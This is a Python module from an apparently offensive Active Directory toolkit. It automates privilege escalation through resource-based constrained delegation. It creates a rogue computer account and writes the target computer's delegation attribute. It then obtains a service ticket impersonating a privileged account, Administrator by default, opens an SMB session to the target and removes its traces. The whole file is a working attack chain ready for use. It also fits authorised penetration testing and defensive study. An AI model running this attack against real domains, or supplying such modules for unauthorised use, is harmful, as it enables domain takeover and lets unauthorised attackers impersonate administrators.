import os
import random
import string

from module import BaseModule
from tool import Tool

class ConstrainedDelegation(BaseModule):
    path = "delegation/rbcd"
    description = "Privilege escalation via resource-based constrained delegation."
    info = """Prerequisites: The compromised account has permissions to write to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of a target computer account.

Common scenarios include:
  - The compromised user is in the Account Operators group.
  - The compromised user has GenericAll, GenericWrite, or WriteProperty permissions on the TARGET_COMPUTER$ object.
  - The compromised user has the AllExtendedRights permission, which includes the ability to write that attribute."""

    options = {
        "dc_ip": {"default": "", "description": "DC IP or host address. If blank, the domain name will be used.", "required": False},
        "target_account": {"default": "Administrator", "description": "Target account to impersonate.", "required": True},
        "target_computer_fqdn": {"default": "", "description": "Target computer FQDN (eg. dc01.domain.local)", "required": True},
        "target_computer_account": {"default": "dc01$", "description": "Target computer account name (eg. dc01$)", "required": True},

        "domain":   {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    def _random_computer_name(self) -> str:
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"RBCD{suffix}$"

    def _random_password(self) -> str:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
        return "".join(random.choices(alphabet, k=20))
   
    async def run(self):
        if not self.validate_options():
            return

        tool = Tool(self)

        os.chdir(self.logs_dir)
        self.opts.dc_ip = self.adutils.get_dc_ip(self.opts.dc_ip, self.opts.domain)
        self.opts.dc_hostname = self.adutils.get_dc_hostname(self.opts.dc_ip, self.opts.domain)
        if not tool.set_auth(from_module=True):
            return

        computer_name = self._random_computer_name()
        computer_password = self._random_password()

        tool.title("Create a computer account for the attack")
        if not await tool.add_computer(computer_name, computer_password):
            return

        tool.title("Modify Target's RBCD Attribute")
        if not await tool.add_rbcd(self.opts.target_computer_account, computer_name):
            return

        tool.title("Perform S4U2Self + S4U2Proxy to obtain a service ticket")
        if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=computer_name, password=computer_password):
            return
        ticket = await tool.get_st(['-spn', f"cifs/{self.opts.target_computer_fqdn}", '-impersonate', self.opts.target_account])
        
        if not ticket:
            return

        tool.title("Authenticate to the target service using smbclient")
        if not tool.set_auth(auth="krb", domain=self.opts.domain, username=self.opts.target_account, ticket=ticket):
            return
        await tool.smbclient(self.opts.target_computer_fqdn)

        tool.title("Clean up attack artifacts")
        if tool.set_auth(from_module=True):
            await tool.remove_rbcd(self.opts.target_computer_account, computer_name)
            await tool.remove_computer(computer_name)

        self.pane_b.write(
            f"[green bold]Attack successful. Ticket saved in {ticket}. "
            "Cleanup was attempted for RBCD and the temporary computer account; verify deletion if access checks failed.[/green bold]"
        )
